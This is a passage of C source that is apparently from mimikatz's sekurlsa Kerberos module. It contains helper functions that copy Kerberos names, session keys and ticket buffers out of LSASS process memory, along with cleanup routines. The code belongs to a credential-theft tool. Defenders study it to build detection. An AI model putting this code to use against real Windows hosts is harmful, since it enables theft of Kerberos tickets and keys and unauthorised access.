			if(pTempName = (PKERB_EXTERNAL_NAME) LocalAlloc(LPTR, i))
			{
				*pExternalName = pTempName;
				aLocalBuffer.address = pTempName;
				if(status = kull_m_memory_copy(&aLocalBuffer, &aName, i))
					for(i = 0; status && (i < pTempName->NameCount); i++)
						status = kull_m_string_getUnicodeString(&pTempName->Names[i], hLSASS);
			}
		}
	}
}

void kuhl_m_sekurlsa_kerberos_createKiwiKerberosBuffer(PKIWI_KERBEROS_BUFFER pBuffer, PKULL_M_MEMORY_HANDLE hLSASS)
{
	BOOL status = FALSE;
	KULL_M_MEMORY_HANDLE  hBuffer = {KULL_M_MEMORY_TYPE_OWN, NULL};
	KULL_M_MEMORY_ADDRESS aBuffer = {pBuffer->Value, hLSASS}, aLocalBuffer = {NULL, &hBuffer};
	
	pBuffer->Value = NULL;
	if(aBuffer.address)
	{
		if(aLocalBuffer.address = LocalAlloc(LPTR, pBuffer->Length))
		{
			pBuffer->Value = (PUCHAR) aLocalBuffer.address;
			kull_m_memory_copy(&aLocalBuffer, &aBuffer, pBuffer->Length);
		}
	}
}

void kuhl_m_sekurlsa_kerberos_freeTicket(PKIWI_KERBEROS_TICKET ticket)
{
	if(ticket)
	{
		kuhl_m_sekurlsa_kerberos_freeExternalName(ticket->ServiceName);
		kull_m_string_freeUnicodeStringBuffer(&ticket->DomainName);
		kuhl_m_sekurlsa_kerberos_freeExternalName(ticket->TargetName);
		kull_m_string_freeUnicodeStringBuffer(&ticket->TargetDomainName);
		kuhl_m_sekurlsa_kerberos_freeExternalName(ticket->ClientName);
		kull_m_string_freeUnicodeStringBuffer(&ticket->AltTargetDomainName);
		kull_m_string_freeUnicodeStringBuffer(&ticket->Description);
		kuhl_m_sekurlsa_kerberos_freeKiwiKerberosBuffer(&ticket->Key);
		kuhl_m_sekurlsa_kerberos_freeKiwiKerberosBuffer(&ticket->Ticket);
		LocalFree(ticket);
	}
}

void kuhl_m_sekurlsa_kerberos_freeExternalName(PKERB_EXTERNAL_NAME pName)
{
	DWORD i;
	if(pName)
	{
		for(i = 0; i < pName->NameCount; i++)
			kull_m_string_freeUnicodeStringBuffer(&pName->Names[i]);
		LocalFree(pName);
	}
}

void kuhl_m_sekurlsa_kerberos_freeKiwiKerberosBuffer(PKIWI_KERBEROS_BUFFER pBuffer)
{
	if(pBuffer->Value)
		LocalFree(pBuffer->Value);
}